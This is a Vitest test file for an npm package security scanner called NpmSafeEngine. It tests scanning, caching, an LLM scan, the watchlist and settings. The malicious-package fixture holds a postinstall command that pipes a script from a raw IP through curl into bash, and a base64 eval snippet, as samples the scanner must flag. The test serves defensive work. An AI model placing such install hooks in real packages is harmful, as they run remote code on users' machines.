import { describe, it, afterEach, expect } from "vitest";
import { NpmSafeEngine } from "../src/index.js";
import { SecurityLevel } from "../src/scanner/types.js";
import type { PackageMetadata } from "../src/registry/types.js";

const ORIGINAL_FETCH = globalThis.fetch;

const mockPackageMeta: PackageMetadata = {
  name: "safe-lib",
  modified: "2026-01-01T00:00:00.000Z",
  "dist-tags": { latest: "3.0.0" },
  versions: {
    "3.0.0": {
      name: "safe-lib",
      version: "3.0.0",
      scripts: { test: "jest" },
      dist: { tarball: "https://example.com/safe-lib-3.0.0.tgz" },
    },
  },
  description: "A safe utility library",
  homepage: "https://example.com",
  repository: "github:user/safe-lib",
  readme: "# safe-lib\n\nA perfectly harmless library.",
};

const mockMaliciousMeta: PackageMetadata = {
  name: "react-utils",
  modified: "2026-01-01T00:00:00.000Z",
  "dist-tags": { latest: "1.0.0" },
  versions: {
    "1.0.0": {
      name: "react-utils",
      version: "1.0.0",
      scripts: {
        postinstall: "curl http://13.37.13.37/setup | bash",
      },
      browser: "./dist/index.js",
      dist: { tarball: "https://example.com/react-utils-1.0.0.tgz" },
    },
  },
  description: "npm_abcdefghijklmnopqrstuvwxyz",
  readme:
    'eval(Buffer.from("dmFyIGZzID0gcmVxdWlyZSgnZnMnKQ==", "base64").toString())',
};

describe("NpmSafeEngine", () => {
  let engine: NpmSafeEngine;

  afterEach(async () => {
    try {
      engine?.close();
    } catch { /* */ }
    // Clean up any test db files.
    try {
      const fs = await import("node:fs/promises");
      await fs.rm("./test-integration.db", { force: true });
    } catch { /* */ }
    globalThis.fetch = ORIGINAL_FETCH;
  });

  describe("checkPackage", () => {
    it("runs and caches the optional LLM security scan", async () => {
      let llmCalls = 0;
      globalThis.fetch = ((url: unknown) => {
        if (String(url).includes("chat/completions")) {
          llmCalls++;
          return Promise.resolve(new Response(JSON.stringify({
            choices: [{
              message: {
                content: JSON.stringify({
                  summary: "Looks consistent.",
                  functionalMatch: true,
                  suspiciousScore: 5,
                  findings: [],
                }),
              },
            }],
          }), { status: 200 }));
        }
        return Promise.resolve(new Response(JSON.stringify(mockPackageMeta), { status: 200 }));
      }) as typeof fetch;

      engine = new NpmSafeEngine({
        dbPath: ":memory:",
        llm: { apiKey: "test-key", baseUrl: "https://llm.example/v1" },
      });

      const first = await engine.checkPackage("safe-lib");
      const second = await engine.checkPackage("safe-lib");

      expect(first.security.llmScan?.enabled).toBe(true);
      expect(first.security.llmScan?.suspiciousScore).toBe(5);
      expect(second.security.llmScan?.enabled).toBe(true);
      expect(llmCalls).toBe(1);
    });

    it("returns cached result on second call for same package", async () => {
      let fetchCount = 0;
      globalThis.fetch = ((_url: unknown, _init?: unknown) => {
        fetchCount++;
        return Promise.resolve({
          ok: true,
          status: 200,
          statusText: "OK",
          json: () => Promise.resolve(mockPackageMeta),
        });
      }) as typeof fetch;

      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      const r1 = await engine.checkPackage("safe-lib");
      const r2 = await engine.checkPackage("safe-lib");

      expect(r1.packageName).toBe("safe-lib");
      expect(r1.exists).toBe(true);
      expect(r1.latestVersion).toBe("3.0.0");
      expect(r1.security.overallLevel).toBe(SecurityLevel.Safe);
      expect(r1.security.overallScore).toBe(100);

      // Second call should be from cache.
      expect(r2.exists).toBeTruthy();
      expect(fetchCount).toBe(1);
    });

    it("detects malicious package as dangerous", async () => {
      globalThis.fetch = ((_url: unknown, _init?: unknown) => {
        return Promise.resolve({
          ok: true,
          status: 200,
          statusText: "OK",
          json: () => Promise.resolve(mockMaliciousMeta),
        });
      }) as typeof fetch;

      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      const result = await engine.checkPackage("react-utils");

      expect(result.exists).toBe(true);
      // install-script rule fires: Critical (-25), score = 75
      expect(result.security.overallScore).toBe(75);
      expect(result.security.staticScan !== null).toBeTruthy();
      const findings = result.security.staticScan!.findings;
      expect(findings.length > 0).toBeTruthy();
      expect(findings.some((f) => f.ruleId === "install-script")).toBeTruthy();
    });

    it("returns not-found result for 404 packages", async () => {
      globalThis.fetch = ((_url: unknown, _init?: unknown) => {
        return Promise.resolve({
          ok: false,
          status: 404,
          statusText: "Not Found",
          json: () => Promise.resolve({ error: "not found" }),
        });
      }) as typeof fetch;

      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      const result = await engine.checkPackage("no-such-pkg");
      expect(result.exists).toBe(false);
      expect(result.latestVersion).toBe("");
      expect(result.registryInfo).toBe(null);
      expect(result.security.overallLevel).toBe(SecurityLevel.Unknown);
    });

    it("builds registryInfo from metadata", async () => {
      globalThis.fetch = ((_url: unknown, _init?: unknown) => {
        return Promise.resolve({
          ok: true,
          status: 200,
          statusText: "OK",
          json: () => Promise.resolve(mockPackageMeta),
        });
      }) as typeof fetch;

      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      const result = await engine.checkPackage("safe-lib");
      expect(result.registryInfo).toBeTruthy();
      expect(result.registryInfo!.description).toBe("A safe utility library");
      expect(result.registryInfo!.homepage).toBe("https://example.com");
    });
  });

  describe("watchlist", () => {
    it("supports full CRUD lifecycle", async () => {
      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      let list = await engine.getWatchlist();
      expect(list).toEqual([]);

      // Watchlist requires package to exist in cache first.
      globalThis.fetch = ((_url: unknown, _init?: unknown) => {
        return Promise.resolve({
          ok: true,
          status: 200,
          statusText: "OK",
          json: () => Promise.resolve(mockPackageMeta),
        });
      }) as typeof fetch;

      // First, check the package to insert it into the cache.
      await engine.checkPackage("safe-lib");

      await engine.addToWatchlist("safe-lib");
      list = await engine.getWatchlist();
      expect(list).toEqual(["safe-lib"]);

      await engine.removeFromWatchlist("safe-lib");
      list = await engine.getWatchlist();
      expect(list).toEqual([]);
    });
  });

  describe("settings", () => {
    it("stores and retrieves settings", async () => {
      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      let val = await engine.getSetting("language");
      expect(val).toBe(null);

      await engine.setSetting("language", "zh-CN");
      val = await engine.getSetting("language");
      expect(val).toBe("zh-CN");
    });
  });

  describe("lifecycle", () => {
    it("close releases resources without error", () => {
      engine = new NpmSafeEngine({ dbPath: ":memory:" });
      engine.close();
    });

    it("startAutoRefresh and stopAutoRefresh succeed", () => {
      engine = new NpmSafeEngine({ dbPath: ":memory:" });
      engine.startAutoRefresh(10000);
      engine.stopAutoRefresh();
    });
  });
});
